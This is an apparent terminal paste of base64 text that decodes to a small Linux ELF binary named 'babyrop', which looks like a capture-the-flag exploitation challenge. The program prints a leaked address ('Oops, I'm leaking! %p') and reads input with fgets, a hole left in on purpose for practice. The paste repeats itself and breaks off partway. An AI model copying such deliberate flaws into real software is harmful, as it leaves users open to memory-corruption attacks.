AAAAAAAAAAAAAAAAAwANAJAGQAAAAAAAAAAAAAAAAAAAAAAAAwAOAKAGQAAAAAAAAAAAAAAAAAAA

AAAAAwAPAAQJQAAAAAAAAAAAAAAAAAAAAAAAAwAQABAJQAAAAAAAAAAAAAAAAAAAAAAAAwARAEwJ

QAAAAAAAAAAAAAAAAAAAAAAAAwASAJAJQAAAAAAAAAAAAAAAAAAAAAAAAwATABAOYAAAAAAAAAAA

AAAAAAAAAAAAAwAUABgOYAAAAAAAAAAAAAAAAAAAAAAAAwAVACAOYAAAAAAAAAAAAAAAAAAAAAAA

AwAWACgOYAAAAAAAAAAAAAAAAAAAAAAAAwAXAPgPYAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAQYAAA

AAAAAAAAAAAAAAAAAAAAAwAZAFgQYAAAAAAAAAAAAAAAAAAAAAAAAwAaAIAQYAAAAAAAAAAAAAAA

AAAAAAAAAwAbAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAV

ACAOYAAAAAAAAAAAAAAAAAAZAAAAAgAOANAGQAAAAAAAAAAAAAAAAAAbAAAAAgAOABAHQAAAAAAA

AAAAAAAAAAAuAAAAAgAOAFAHQAAAAAAAAAAAAAAAAABEAAAAAQAaAKgQYAAAAAAAAQAAAAAAAABT

AAAAAQAUABgOYAAAAAAAAAAAAAAAAAB6AAAAAgAOAHAHQAAAAAAAAAAAAAAAAACGAAAAAQATABAO

YAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAA

AAAAAACvAAAAAQASAMAKQAAAAAAAAAAAAAAAAAC9AAAAAQAVACAOYAAAAAAAAAAAAAAAAAAAAAAA

BADx/wAAAAAAAAAAAAAAAAAAAADJAAAAAAATABgOYAAAAAAAAAAAAAAAAADaAAAAAQAWACgOYAAA

AAAAAAAAAAAAAADjAAAAAAATABAOYAAAAAAAAAAAAAAAAAD2AAAAAAARAEwJQAAAAAAAAAAAAAAA

AAAJAQAAAQAYAAAQYAAAAAAAAAAAAAAAAAAfAQAAEgAOAAAJQAAAAAAAAgAAAAAAAAAvAQAAIAAA

AAAAAAAAAAAAAAAAAAAAAABLAQAAEQAaAIAQYAAAAAAACAAAAAAAAADtAQAAIAAZAFgQYAAAAAAA

AAAAAAAAAABfAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABxAQAAEQAaAJAQYAAAAAAACAAAAAAAAACE

AQAAEAAZAGgQYAAAAAAAAAAAAAAAAAApAQAAEgAPAAQJQAAAAAAAAAAAAAAAAACLAQAAEgAAAAAA

AAAAAAAAAAAAAAAAAACfAQAAEgAOALUHQAAAAAAAegAAAAAAAACmAQAAEgAAAAAAAAAAAAAAAAAA

AAAAAAC5AQAAEgAAAAAAAAAAAAAAAAAAAAAAAADYAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADrAQAA

EAAZAFgQYAAAAAAAAAAAAAAAAAD4AQAAEgAAAAAAAAAAAAAAAAAAAAAAAAAMAgAAIAAAAAAAAAAA

AAAAAAAAAAAAAAAbAgAAEQIZAGAQYAAAAAAAAAAAAAAAAAAoAgAAEQAQABAJQAAAAAAABAAAAAAA

AAA3AgAAEgAOAJAIQAAAAAAAZQAAAAAAAADVAAAAEAAaALAQYAAAAAAAAAAAAAAAAADxAQAAEgAO

AKAGQAAAAAAAKgAAAAAAAABHAgAAEgAOAJYHQAAAAAAAHwAAAAAAAABPAgAAEAAaAGgQYAAAAAAA

AAAAAAAAAABbAgAAEgAOAC8IQAAAAAAAYAAAAAAAAABgAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAB1

AgAAIAAAAAAAAAAAAAAAAAAAAAAAAACJAgAAEgAAAAAAAAAAAAAAAAAAAAAAAACbAgAAEQIZAGgQ

YAAAAAAAAAAAAAAAAACnAgAAIAAAAAAAAAAAAAAAAAAAAAAAAACgAQAAEgALANgFQAAAAAAAAAAA

AAAAAADBAgAAEQAaAKAQYAAAAAAACAAAAAAAAAAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVy

ZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43NTg1AF9f

ZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVf

ZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBiYWJ5cm9wLmMAX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRf

XwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9G

UkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfSVRNX2RlcmVn

aXN0ZXJUTUNsb25lVGFibGUAc3Rkb3V0QEBHTElCQ18yLjIuNQBwdXRzQEBHTElCQ18yLjIuNQBz

dGRpbkBAR0xJQkNfMi4yLjUAX2VkYXRhAHByaW50ZkBAR0xJQkNfMi4yLjUAX19pbml0AGFsYXJt

QEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4yLjUAZmdldHNAQEdMSUJD

XzIuMi41AF9fZGF0YV9zdGFydABzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAF9f

ZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfY3N1X2luaXQAaGFuZGxlcgBfX2Jzc19z

dGFydABtYWluAHNldHZidWZAQEdMSUJDXzIuMi41AF9Kdl9SZWdpc3RlckNsYXNzZXMAZXhpdEBA

R0xJQkNfMi4yLjUAX19UTUNfRU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBzdGRlcnJA

QEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJ

LXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZl

cnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAu

dGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5m

aW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAABsAAAABAAAAAgAAAAAAAAA4AkAAAAAAADgCAAAAAAAAHAAAAAAAAAAAAAAAAAAA

AAEAAAAAAAAAAAAAAAAAAAAjAAAABwAAAAIAAAAAAAAAVAJAAAAAAABUAgAAAAAAACAAAAAAAAAA

AAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAMQAAAAcAAAACAAAAAAAAAHQCQAAAAAAAdAIAAAAAAAAk

AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAD2//9vAgAAAAAAAACYAkAAAAAAAJgC

AAAAAAAAMAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABOAAAACwAAAAIAAAAAAAAAyAJA

AAAAAADIAgAAAAAAADgBAAAAAAAABgAAAAEAAAAIAAAAAAAAABgAAAAAAAAAVgAAAAMAAAACAAAA

AAAAAAAEQAAAAAAAAAQAAAAAAAB4AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAF4AAAD/

//9vAgAAAAAAAAB4BEAAAAAAAHgEAAAAAAAAGgAAAAAAAAAFAAAAAAAAAAIAAAAAAAAAAgAAAAAA

AABrAAAA/v//bwIAAAAAAAAAmARAAAAAAACYBAAAAAAAACAAAAAAAAAABgAAAAEAAAAIAAAAAAAA

AAAAAAAAAAAAegAAAAQAAAACAAAAAAAAALgEQAAAAAAAuAQAAAAAAABgAAAAAAAAAAUAAAAAAAAA

CAAAAAAAAAAYAAAAAAAAAIQAAAAEAAAAQgAAAAAAAAAYBUAAAAAAABgFAAAAAAAAwAAAAAAAAAAF

AAAAGAAAAAgAAAAAAAAAGAAAAAAAAACOAAAAAQAAAAYAAAAAAAAA2AVAAAAAAADYBQAAAAAAABoA

AAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAiQAAAAEAAAAGAAAAAAAAAAAGQAAAAAAAAAYA

AAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJQAAAABAAAABgAAAAAAAACQBkAA

AAAAAJAGAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACdAAAAAQAAAAYAAAAA

AAAAoAZAAAAAAACgBgAAAAAAAGICAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAowAAAAEA

AAAGAAAAAAAAAAQJQAAAAAAABAkAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAA

AKkAAAABAAAAAgAAAAAAAAAQCUAAAAAAABAJAAAAAAAAOQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAA

AAAAAAAAAACxAAAAAQAAAAIAAAAAAAAATAlAAAAAAABMCQAAAAAAAEQAAAAAAAAAAAAAAAAAAAAE

AAAAAAAAAAAAAAAAAAAAvwAAAAEAAAACAAAAAAAAAJAJQAAAAAAAkAkAAAAAAAA0AQAAAAAAAAAA

AAAAAAAACAAAAAAAAAAAAAAAAAAAAMkAAAAOAAAAAwAAAAAAAAAQDmAAAAAAABAOAAAAAAAACAAA

AAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADVAAAADwAAAAMAAAAAAAAAGA5gAAAAAAAYDgAA

AAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA4QAAAAEAAAADAAAAAAAAACAOYAAA

AAAAIA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOYAAAAGAAAAAwAAAAAA

AAAoDmAAAAAAACgOAAAAAAAA0AEAAAAAAAAGAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACYAAAAAQAA

AAMAAAAAAAAA+A9gAAAAAAD4DwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA

7wAAAAEAAAADAAAAAAAAAAAQYAAAAAAAABAAAAAAAABYAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAI

AAAAAAAAAPgAAAABAAAAAwAAAAAAAABYEGAAAAAAAFgQAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgA

AAAAAAAAAAAAAAAAAAD+AAAACAAAAAMAAAAAAAAAgBBgAAAAAABoEAAAAAAAADAAAAAAAAAAAAAA

AAAAAAAgAAAAAAAAAAAAAAAAAAAAAwEAAAEAAAAwAAAAAAAAAAAAAAAAAAAAaBAAAAAAAAA0AAAA

AAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAMUaAAAA

AAAADAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAA

AACgEAAAAAAAAFAHAAAAAAAAHgAAAC8AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAA

AAAAAAAAAAAA8BcAAAAAAADVAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==





kali@kali:echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAoAZAAAAAAABAAAAAAAAAANgbAAAAAAAAAAAAAEAAOAAJ

AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA

AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCQAAAAAAAOAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA

AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAMQKAAAAAAAAxAoAAAAAAAAAACAA

AAAAAAEAAAAGAAAAEA4AAAAAAAAQDmAAAAAAABAOYAAAAAAAWAIAAAAAAACgAgAAAAAAAAAAIAAA

AAAAAgAAAAYAAAAoDgAAAAAAACgOYAAAAAAAKA5gAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA

AAAEAAAABAAAAFQCAAAAAAAAVAJAAAAAAABUAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA

AFDldGQEAAAATAkAAAAAAABMCUAAAAAAAEwJQAAAAAAARAAAAAAAAABEAAAAAAAAAAQAAAAAAAAA

UeV0ZAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS

5XRkBAAAABAOAAAAAAAAEA5gAAAAAAAQDmAAAAAAAPABAAAAAAAA8AEAAAAAAAABAAAAAAAAAC9s

aWI2NC9sZC1saW51eC14ODYtNjQuc28uMgAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAAIAAA

AAQAAAAUAAAAAwAAAEdOVQDkI9JfHEHDGKj1cC+TuOP0cnMlagMAAAAKAAAAAQAAAAYAAAAAASAA

gAEQAgoAAAALAAAAAAAAACkdjBxmVWEQOfKLHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABcAAAAS

AAAAAAAAAAAAAAAAAAAAAAAAACIAAAASAAAAAAAAAAAAAAAAAAAAAAAAAD0AAAASAAAAAAAAAAAA

AAAAAAAAAAAAAEsAAAASAAAAAAAAAAAAAAAAAAAAAAAAACkAAAASAAAAAAAAAAAAAAAAAAAAAAAA

ABAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAF0AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEMAAAASAAAA

AAAAAAAAAAAAAAAAAAAAAAsAAAASAAAAAAAAAAAAAAAAAAAAAAAAAC8AAAARABoAgBBgAAAAAAAI

AAAAAAAAABwAAAARABoAkBBgAAAAAAAIAAAAAAAAADYAAAARABoAoBBgAAAAAAAIAAAAAAAAAABs

aWJjLnNvLjYAZXhpdABzaWduYWwAcHV0cwBzdGRpbgBwcmludGYAZmdldHMAc3Rkb3V0AHN0ZGVy

cgBhbGFybQBzZXR2YnVmAF9fbGliY19zdGFydF9tYWluAF9fZ21vbl9zdGFydF9fAEdMSUJDXzIu

Mi41AAAAAgACAAIAAgACAAIAAAACAAIAAgACAAIAAAAAAAAAAQABAAEAAAAQAAAAAAAAAHUaaQkA

AAIAbAAAAAAAAAD4D2AAAAAAAAYAAAAHAAAAAAAAAAAAAACAEGAAAAAAAAUAAAAKAAAAAAAAAAAA

AACQEGAAAAAAAAUAAAALAAAAAAAAAAAAAACgEGAAAAAAAAUAAAAMAAAAAAAAAAAAAAAYEGAAAAAA

AAcAAAABAAAAAAAAAAAAAAAgEGAAAAAAAAcAAAACAAAAAAAAAAAAAAAoEGAAAAAAAAcAAAADAAAA

AAAAAAAAAAAwEGAAAAAAAAcAAAAEAAAAAAAAAAAAAAA4EGAAAAAAAAcAAAAFAAAAAAAAAAAAAABA

EGAAAAAAAAcAAAAGAAAAAAAAAAAAAABIEGAAAAAAAAcAAAAIAAAAAAAAAAAAAABQEGAAAAAAAAcA

AAAJAAAAAAAAAAAAAABIg+wISIsFFQogAEiFwHQF6KMAAABIg8QIwwAAAAAAAAAAAAAAAAAA/zUC

CiAA/yUECiAADx9AAP8lAgogAGgAAAAA6eD/////JfoJIABoAQAAAOnQ/////yXyCSAAaAIAAADp

wP////8l6gkgAGgDAAAA6bD/////JeIJIABoBAAAAOmg/////yXaCSAAaAUAAADpkP////8l0gkg

AGgGAAAA6YD/////JcoJIABoBwAAAOlw/////yViCSAAZpAAAAAAAAAAADHtSYnRXkiJ4kiD5PBQ

VEnHwAAJQABIx8GQCEAASMfHLwhAAOh3////9GYPH0QAALhvEGAAVUgtaBBgAEiD+A5IieV2G7gA

AAAASIXAdBFdv2gQYAD/4GYPH4QAAAAAAF3DDx9AAGYuDx+EAAAAAAC+aBBgAFVIge5oEGAASMH+

A0iJ5UiJ8EjB6D9IAcZI0f50FbgAAAAASIXAdAtdv2gQYAD/4A8fAF3DZg8fRAAAgD1RCSAAAHUR

VUiJ5ehu////XcYFPgkgAAHzww8fQAC/IA5gAEiDPwB1BeuTDx8AuAAAAABIhcB08VVIieX/0F3p

ev///1VIieVIg+wQiX38vxQJQADoZf7//78AAAAA6Mv+//9VSInlvpYHQAC/DgAAAOiY/v//v0AA

AADoXv7//0iLBacIIAC5AAAAALoCAAAAvgAAAABIicfogP7//0iLBZkIIAC5AAAAALoCAAAAvgAA

AABIicfoYv7//0iLBYsIIAC5AAAAALoCAAAAvgAAAABIicfoRP7//5Bdw1VIieVIg+xAuAAAAADo

dP///0iNRcBIica/GQlAALgAAAAA6Mn9//+/MAlAAOiv/f//v0YJQAC4AAAAAOiw/f//SIsVGQgg

AEiNRcC+AAIAAEiJx+jI/f//uAAAAADJw5BBV0FWQYn/QVVBVEyNJW4FIABVSI0tbgUgAFNJifZJ

idVMKeVIg+wISMH9A+gX/f//SIXtdCAx2w8fhAAAAAAATInqTIn2RIn/Qf8U3EiDwwFIOet16kiD

xAhbXUFcQV1BXkFfw5BmLg8fhAAAAAAA88MAAEiD7AhIg8QIwwAAAAEAAgBCeWUhAE9vcHMsIEkn

bSBsZWFraW5nISAlcAoAUHduIG1lIMKvXF8o44OEKV8vwq8gAD4gAAAAAAEbAztAAAAABwAAALT8

//+MAAAAVP3//1wAAABK/v//tAAAAGn+///UAAAA4/7///QAAABE////FAEAALT///9cAQAAFAAA

AAAAAAABelIAAXgQARsMBwiQAQcQFAAAABwAAADw/P//KgAAAAAAAAAAAAAAFAAAAAAAAAABelIA

AXgQARsMBwiQAQAAJAAAABwAAAAg/P//kAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABwAAABE

AAAAjv3//x8AAAAAQQ4QhgJDDQYAAAAAAAAAHAAAAGQAAACN/f//egAAAABBDhCGAkMNBgJ1DAcI

AAAcAAAAhAAAAOf9//9gAAAAAEEOEIYCQw0GAlsMBwgAAEQAAACkAAAAKP7//2UAAAAAQg4QjwJC

DhiOA0UOII0EQg4ojAVIDjCGBkgOOIMHTQ5Acg44QQ4wQQ4oQg4gQg4YQg4QQg4IABQAAADsAAAA

UP7//wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAcAdAAAAAAABQB0AAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAA

2AVAAAAAAAANAAAAAAAAAAQJQAAAAAAAGQAAAAAAAAAQDmAAAAAAABsAAAAAAAAACAAAAAAAAAAa

AAAAAAAAABgOYAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAJAAAAAAAAFAAAAAAAAAAAE

QAAAAAAABgAAAAAAAADIAkAAAAAAAAoAAAAAAAAAeAAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAA

AAAAAAAAAAAAAAAAAAMAAAAAAAAAABBgAAAAAAACAAAAAAAAAMAAAAAAAAAAFAAAAAAAAAAHAAAA

AAAAABcAAAAAAAAAGAVAAAAAAAAHAAAAAAAAALgEQAAAAAAACAAAAAAAAABgAAAAAAAAAAkAAAAA

AAAAGAAAAAAAAAD+//9vAAAAAJgEQAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAeARAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgOYAAAAAAA

AAAAAAAAAAAAAAAAAAAAABYGQAAAAAAAJgZAAAAAAAA2BkAAAAAAAEYGQAAAAAAAVgZAAAAAAABm

BkAAAAAAAHYGQAAAAAAAhgZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAR0NDOiAoVWJ1bnR1IDUuNC4w

LTZ1YnVudHUxfjE2LjA0LjUpIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAwABADgCQAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAA

AwADAHQCQAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFAMgCQAAA

AAAAAAAAAAAAAAAAAAAAAwAGAAAEQAAAAAAAAAAAAAAAAAAAAAAAAwAHAHgEQAAAAAAAAAAAAAAA

AAAAAAAAAwAIAJgEQAAAAAAAAAAAAAAAAAAAAAAAAwAJALgEQAAAAAAAAAAAAAAAAAAAAAAAAwAK

ABgFQAAAAAAAAAAAAAAAAAAAAAAAAwALANgFQAAAAAAAAAAAAAAAAAAAAAAAAwAMAAAGQAAAAAAA

AAAAAAAAAAAAAAAAAwANAJAGQAAAAAAAAAAAAAAAAAAAAAAAAwAOAKAGQAAAAAAAAAAAAAAAAAAA

AAAAAwAPAAQJQAAAAAAAAAAAAAAAAAAAAAAAAwAQABAJQAAAAAAAAAAAAAAAAAAAAAAAAwARAEwJ

QAAAAAAAAAAAAAAAAAAAAAAAAwASAJAJQAAAAAAAAAAAAAAAAAAAAAAAAwATABAOYAAAAAAAAAAA

AAAAAAAAAAAAAwAUABgOYAAAAAAAAAAAAAAAAAAAAAAAAwAVACAOYAAAAAAAAAAAAAAAAAAAAAAA

AwAWACgOYAAAAAAAAAAAAAAAAAAAAAAAAwAXAPgPYAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAQYAAA

AAAAAAAAAAAAAAAAAAAAAwAZAFgQYAAAAAAAAAAAAAAAAAAAAAAAAwAaAIAQYAAAAAAAAAAAAAAA

AAAAAAAAAwAbAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAV

ACAOYAAAAAAAAAAAAAAAAAAZAAAAAgAOANAGQAAAAAAAAAAAAAAAAAAbAAAAAgAOABAHQAAAAAAA

AAAAAAAAAAAuAAAAAgAOAFAHQAAAAAAAAAAAAAAAAABEAAAAAQAaAKgQYAAAAAAAAQAAAAAAAABT

AAAAAQAUABgOYAAAAAAAAAAAAAAAAAB6AAAAAgAOAHAHQAAAAAAAAAAAAAAAAACGAAAAAQATABAO

YAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAA

AAAAAACvAAAAAQASAMAKQAAAAAAAAAAAAAAAAAC9AAAAAQAVACAOYAAAAAAAAAAAAAAAAAAAAAAA

BADx/wAAAAAAAAAAAAAAAAAAAADJAAAAAAATABgOYAAAAAAAAAAAAAAAAADaAAAAAQAWACgOYAAA

AAAAAAAAAAAAAADjAAAAAAATABAOYAAAAAAAAAAAAAAAAAD2AAAAAAARAEwJQAAAAAAAAAAAAAAA

AAAJAQAAAQAYAAAQYAAAAAAAAAAAAAAAAAAfAQAAEgAOAAAJQAAAAAAAAgAAAAAAAAAvAQAAIAAA

AAAAAAAAAAAAAAAAAAAAAABLAQAAEQAaAIAQYAAAAAAACAAAAAAAAADtAQAAIAAZAFgQYAAAAAAA

AAAAAAAAAABfAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABxAQAAEQAaAJAQYAAAAAAACAAAAAAAAACE

AQAAEAAZAGgQYAAAAAAAAAAAAAAAAAApAQAAEgAPAAQJQAAAAAAAAAAAAAAAAACLAQAAEgAAAAAA

AAAAAAAAAAAAAAAAAACfAQAAEgAOALUHQAAAAAAAegAAAAAAAACmAQAAEgAAAAAAAAAAAAAAAAAA

AAAAAAC5AQAAEgAAAAAAAAAAAAAAAAAAAAAAAADYAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADrAQAA

EAAZAFgQYAAAAAAAAAAAAAAAAAD4AQAAEgAAAAAAAAAAAAAAAAAAAAAAAAAMAgAAIAAAAAAAAAAA

AAAAAAAAAAAAAAAbAgAAEQIZAGAQYAAAAAAAAAAAAAAAAAAoAgAAEQAQABAJQAAAAAAABAAAAAAA

AAA3AgAAEgAOAJAIQAAAAAAAZQAAAAAAAADVAAAAEAAaALAQYAAAAAAAAAAAAAAAAADxAQAAEgAO

AKAGQAAAAAAAKgAAAAAAAABHAgAAEgAOAJYHQAAAAAAAHwAAAAAAAABPAgAAEAAaAGgQYAAAAAAA

AAAAAAAAAABbAgAAEgAOAC8IQAAAAAAAYAAAAAAAAABgAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAB1

AgAAIAAAAAAAAAAAAAAAAAAAAAAAAACJAgAAEgAAAAAAAAAAAAAAAAAAAAAAAACbAgAAEQIZAGgQ

YAAAAAAAAAAAAAAAAACnAgAAIAAAAAAAAAAAAAAAAAAAAAAAAACgAQAAEgALANgFQAAAAAAAAAAA

AAAAAADBAgAAEQAaAKAQYAAAAAAACAAAAAAAAAAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVy

ZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43NTg1AF9f

ZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVf

ZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBiYWJ5cm9wLmMAX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRf

XwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9G

UkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfSVRNX2RlcmVn

aXN0ZXJUTUNsb25lVGFibGUAc3Rkb3V0QEBHTElCQ18yLjIuNQBwdXRzQEBHTElCQ18yLjIuNQBz

dGRpbkBAR0xJQkNfMi4yLjUAX2VkYXRhAHByaW50ZkBAR0xJQkNfMi4yLjUAX19pbml0AGFsYXJt

QEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4yLjUAZmdldHNAQEdMSUJD

XzIuMi41AF9fZGF0YV9zdGFydABzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAF9f

ZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfY3N1X2luaXQAaGFuZGxlcgBfX2Jzc19z

dGFydABtYWluAHNldHZidWZAQEdMSUJDXzIuMi41AF9Kdl9SZWdpc3RlckNsYXNzZXMAZXhpdEBA

R0xJQkNfMi4yLjUAX19UTUNfRU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBzdGRlcnJA

QEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJ

LXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZl

